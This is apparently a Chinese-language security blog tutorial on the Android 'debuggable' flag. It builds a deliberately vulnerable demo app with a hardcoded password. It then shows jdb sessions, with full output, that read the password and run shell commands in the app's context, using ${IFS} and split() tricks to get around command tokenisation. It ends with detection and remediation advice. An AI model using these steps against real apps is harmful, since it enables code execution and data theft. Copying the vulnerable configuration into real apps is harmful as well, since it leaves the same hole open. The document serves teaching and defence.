---
layout: post
title: "Learn Android Application Debuggable"
---

# 0x00 漏洞原理

如果对于已经发布的Android应用，在AndroidManifest.xml中设置了`android:debuggable`为`true`，[意味着](https://developer.android.com/guide/topics/manifest/application-element#debug)应用程序可以被调试，因此会引入安全风险。后文通过搭建环境调试应用程序，实现漏洞的简单利用。

<!-- more -->

[F-secure](https://labs.f-secure.com/archive/debuggable-apps-in-android-market/)深入分析过此问题。如果应用程序开启了debuggable，则会尝试连接`@jdwp-control`这个unix socket并发送自身的pid实现注册，此socket由`adbd`打开并使用[Java Debug Wire Protocol](https://docs.oracle.com/javase/8/docs/technotes/guides/jpda/jdwp-spec.html)搭建调试者与被调试者的桥梁；如果`adbd`未启动，则应用程序会不断尝试连接该socket，此时恶意应用就可以伪造socket，借助JWDP来调试应用程序的Java代码，在其上下文中使用`Runtime.getRuntime().exec()`即可执行任意代码。

# 0x01 利用实践

首先写个开启debuggable的应用程序，搞个输入框和按钮画一下activity_main.xml：

```xml
<?xml version="1.0" encoding="utf-8"?>
<androidx.constraintlayout.widget.ConstraintLayout xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:app="http://schemas.android.com/apk/res-auto"
    xmlns:tools="http://schemas.android.com/tools"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    tools:context=".MainActivity">

    <EditText
        android:id="@+id/editText"
        android:layout_width="0dp"
        android:layout_height="wrap_content"
        android:layout_marginStart="8dp"
        android:layout_marginLeft="8dp"
        android:layout_marginTop="8dp"
        android:layout_marginEnd="8dp"
        android:layout_marginRight="8dp"
        android:hint="@string/input_password"
        android:inputType="textPassword"
        app:layout_constraintEnd_toStartOf="@+id/button"
        app:layout_constraintStart_toStartOf="parent"
        app:layout_constraintTop_toTopOf="parent" />

    <Button
        android:id="@+id/button"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:layout_marginEnd="8dp"
        android:layout_marginRight="8dp"
        android:onClick="checkPassword"
        android:text="@string/check"
        app:layout_constraintBaseline_toBaselineOf="@+id/editText"
        app:layout_constraintEnd_toEndOf="parent" />

    <TextView
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:text="Hello World!"
        app:layout_constraintBottom_toBottomOf="parent"
        app:layout_constraintLeft_toLeftOf="parent"
        app:layout_constraintRight_toRightOf="parent"
        app:layout_constraintTop_toTopOf="parent" />

</androidx.constraintlayout.widget.ConstraintLayout>
```

判断password是否正确的代码，MainActivity.java：

```java
package com.example.helloworld;

import androidx.appcompat.app.AppCompatActivity;

import android.os.Bundle;
import android.view.View;
import android.widget.EditText;
import android.widget.Toast;

public class MainActivity extends AppCompatActivity {

    private final String PASSWORD = "123456";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
    }

    public void checkPassword(View view) {
        EditText editText = (EditText) findViewById(R.id.editText);
        String input = editText.getText().toString();
        Toast toast;

        if (input.equals(PASSWORD))
            toast = Toast.makeText(view.getContext(), "Right!", Toast.LENGTH_LONG);
        else
            toast = Toast.makeText(view.getContext(), "Wrong!", Toast.LENGTH_LONG);

        toast.show();
    }
}
```

最后在AndroidManifest.xml设置debuggable：

```xml
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:tools="http://schemas.android.com/tools"
    package="com.example.helloworld">

    <application
        android:debuggable="true"
        android:allowBackup="true"
        android:icon="@mipmap/ic_launcher"
        android:label="@string/app_name"
        android:roundIcon="@mipmap/ic_launcher_round"
        android:supportsRtl="true"
        android:theme="@style/Theme.Helloworld"
        tools:ignore="HardcodedDebugMode">
        <activity android:name=".MainActivity">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />

                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>
    </application>

</manifest>
```

在启动应用前后使用`adb jdwp`来确认可调试的应用程序进程：

```
➜  platform-tools ./adb jdwp
^C
➜  platform-tools ./adb jdwp
20193
^C
```

再将调试接口转发到本地使用`jdb`调试即可，整体的例子也可参看[这里](https://securitygrind.com/how-to-exploit-a-debuggable-android-application/)：

```
➜  platform-tools ./adb forward tcp:7777 jdwp:20193
➜  platform-tools jdb -attach 127.0.0.1:7777
Set uncaught java.lang.Throwable
Set deferred uncaught java.lang.Throwable
Initializing jdb ...
> stop in com.example.helloworld.MainActivity.checkPassword
Set breakpoint com.example.helloworld.MainActivity.checkPassword
> 
Breakpoint hit: "thread=main", com.example.helloworld.MainActivity.checkPassword(), line=21 bci=0

main[1] print new java.lang.Runtime().exec("ps")
 new java.lang.Runtime().exec("ps") = "Process[pid=20688]"
```

看似简单但有四点需要说明。一是jdb[命令和指令](https://docs.oracle.com/javase/8/docs/technotes/tools/windows/jdb.html#CHDBACHA)的使用，像是`classes`、`methods <class id>`和`fields <class id>`可查看class相关的信息，`locals`可以查看当前栈帧的局部变量信息，`print`和`eval`可以执行java表达式：

```
main[1] methods com.example.helloworld.MainActivity
** methods list **
com.example.helloworld.MainActivity <init>()
com.example.helloworld.MainActivity checkPassword(android.view.View)
com.example.helloworld.MainActivity onCreate(android.os.Bundle)
......
** fields list **
java.lang.String PASSWORD
androidx.appcompat.app.AppCompatDelegate mDelegate (inherited from androidx.appcompat.app.AppCompatActivity)
......
main[1] print PASSWORD
 PASSWORD = "123456"
main[1] locals
Method arguments:
Local variables:
view = instance of com.google.android.material.button.MaterialButton(id=4366)
main[1] next 
> 
Step completed: "thread=main", com.example.helloworld.MainActivity.checkPassword(), line=22 bci=9

main[1] locals
Method arguments:
Local variables:
view = instance of com.google.android.material.button.MaterialButton(id=4366)
editText = instance of androidx.appcompat.widget.AppCompatEditText(id=4367)
main[1] next
> 
Step completed: "thread=main", com.example.helloworld.MainActivity.checkPassword(), line=25 bci=17

main[1] locals
Method arguments:
Local variables:
view = instance of com.google.android.material.button.MaterialButton(id=4366)
editText = instance of androidx.appcompat.widget.AppCompatEditText(id=4367)
input = "123"
```

但当执行`print new java.lang.String("Hello").length()`总是会导致程序报错退出，而且我也不会实例化一个字符串数组：

```
main[1] print new java.lang.String[]{"1", "2"}
com.sun.tools.example.debug.expr.ParseException: Encountered "]" at line 1, column 23.
Was expecting one of:
    "false" ...
    "new" ...
    "null" ...
    "super" ...
    "this" ...
    "true" ...
    <INTEGER_LITERAL> ...
    <FLOATING_POINT_LITERAL> ...
    <CHARACTER_LITERAL> ...
    <STRING_LITERAL> ...
    <IDENTIFIER> ...
    "(" ...
    "!" ...
    "~" ...
    "++" ...
    "--" ...
    "+" ...
    "-" ...
    
 new java.lang.String[]{"1", "2"} = null
main[1] print new java.lang.String("Hello")
com.sun.tools.example.debug.expr.ParseException: Unable to create java.lang.String instance
 new java.lang.String("Hello") = null
Exception in thread "asynchronous jdb command" 
The application has been disconnected
```

二是此问题就相当于可以调试java进程进而利用，但测试下来需要命中断点才能有效执行表达式，msf上有专门针对JDWP的攻击脚本，是切换到sleeping的线程再执行，具体可参看[这里](https://xz.aliyun.com/t/7303)。

三是执行java表达式的过程就相当于是[java命令注入](https://b1ngz.github.io/java-os-command-injection-note/)的过程。因为不会构造字符串数组，所以直接使用`Runtime.getRuntime().exec(String command)`就需要考虑对token字符的[绕过](https://mp.weixin.qq.com/s/zCe_O37rdRqgN-Yvlq1FDg)，因为是在安卓系统环境`base64`命令不存在，所以直接`${IFS}`编码即可绕过：

```
➜  platform-tools jdb -attach 127.0.0.1:7777       
Set uncaught java.lang.Throwable
Set deferred uncaught java.lang.Throwable
Initializing jdb ...
> stop in com.example.helloworld.MainActivity.checkPassword
Set breakpoint com.example.helloworld.MainActivity.checkPassword
> 
Breakpoint hit: "thread=main", com.example.helloworld.MainActivity.checkPassword(), line=21 bci=0

main[1] print java.lang.Runtime.getRuntime().exec("sh -c echo${IFS}\\x41>/data/data/com.example.helloworld/text.txt")
 java.lang.Runtime.getRuntime().exec("sh -c echo${IFS}\\x41>/data/data/com.example.helloworld/text.txt") = "Process[pid=23980]"
main[1] print java.lang.Runtime.getRuntime().exec("sh -c chmod${IFS}+x${IFS}/data/data/com.example.helloworld/text.txt")
 java.lang.Runtime.getRuntime().exec("sh -c chmod${IFS}+x${IFS}/data/data/com.example.helloworld/text.txt") = "Process[pid=24005]"
main[1] exit
➜  platform-tools ./adb shell
shell@hammerhead:/ $ run-as com.example.helloworld
shell@hammerhead:/data/data/com.example.helloworld $ ls -al
drwxrwx--x u0_a89   u0_a89            2021-01-06 19:24 cache
drwxrwx--x u0_a89   u0_a89            2021-01-06 19:24 code_cache
-rwx------ u0_a89   u0_a89          2 2021-01-08 14:30 text.txt
shell@hammerhead:/data/data/com.example.helloworld $ cat text.txt
A
shell@hammerhead:/data/data/com.example.helloworld $ 
```

可惜上下文中不存在`ProcessBuilder(String... command)`，还是想要构造字符串数组的话还是可以[分割](https://docs.oracle.com/javase/8/docs/api/java/lang/String.html#split-java.lang.String-)一下的：

```
➜  platform-tools jdb -attach 127.0.0.1:7777
Set uncaught java.lang.Throwable
Set deferred uncaught java.lang.Throwable
Initializing jdb ...
> stop in com.example.helloworld.MainActivity.checkPassword
Set breakpoint com.example.helloworld.MainActivity.checkPassword
> 
Breakpoint hit: "thread=main", com.example.helloworld.MainActivity.checkPassword(), line=21 bci=0

main[1] print java.lang.Runtime.getRuntime().exec("sh`-c`echo larryxi > /data/data/com.example.helloworld/1.txt".split("`"))
 java.lang.Runtime.getRuntime().exec("sh`-c`echo larryxi > /data/data/com.example.helloworld/1.txt".split("`")) = "Process[pid=24784]"
main[1] exit
➜  platform-tools ./adb shell
shell@hammerhead:/ $ run-as com.example.helloworld
shell@hammerhead:/data/data/com.example.helloworld $ ls -al
-rw------- u0_a89   u0_a89          8 2021-01-08 14:42 1.txt
drwxrwx--x u0_a89   u0_a89            2021-01-06 19:24 cache
drwxrwx--x u0_a89   u0_a89            2021-01-06 19:24 code_cache
-rwx------ u0_a89   u0_a89          2 2021-01-08 14:30 text.txt
shell@hammerhead:/data/data/com.example.helloworld $ cat 1.txt
larryxi
shell@hammerhead:/data/data/com.example.helloworld $ 
```

四是上文中出现的`run-as`[程序](https://manifestsecurity.com/android-application-security-part-21/)，分析源码可知需要满足用户为shell或root，package开启debuggable且数据目录有效，才可以切换用户id和目录浏览其数据文件，也算是泄漏敏感信息的一种方式。较新版本的系统源码中还对目录增加了一些[限制](https://android.googlesource.com/platform/system/core.git/+/refs/heads/android10-c2f2-release/run-as/run-as.cpp#73)，感兴趣的同学可自行探索。

# 0x02 漏洞修复

检测是否存在漏洞只需查看`/data/system/packages.list`[文件](https://blog.csdn.net/weixin_40107510/article/details/78556427)或者AndroidManifest.xml是否开启debuggable；修复则需要将debuggable置为false，并且不要发布可被debug的应用程序。
